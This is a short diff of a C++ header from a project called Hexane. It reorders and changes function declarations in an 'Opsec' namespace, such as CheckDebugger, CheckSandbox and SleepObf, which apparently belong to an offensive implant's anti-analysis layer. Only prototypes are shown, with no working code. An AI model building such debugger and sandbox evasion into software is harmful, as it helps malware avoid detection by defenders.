@@ -1,16 +1,15 @@
 #ifndef HEXANE_CORELIB_OPSEC_HPP
 #define HEXANE_CORELIB_OPSEC_HPP
-
 #include <core/corelib.hpp>
 
 namespace Opsec {
+    FUNCTION BOOL RuntimeChecks();
     FUNCTION BOOL CheckTime();
     FUNCTION BOOL CheckDebugger();
     FUNCTION BOOL CheckSandbox();
     FUNCTION BOOL CheckEnvironment();
-    FUNCTION BOOL RuntimeChecks();
     FUNCTION BOOL ImageCheckArch(const _executable *const image);
-    FUNCTION BOOL ImageCheckCompat(_executable exe, _executable proc);
+    FUNCTION BOOL ImageCheckCompat(const _executable *const source, const _executable *const target);
     FUNCTION VOID SleepObf();
 }
 
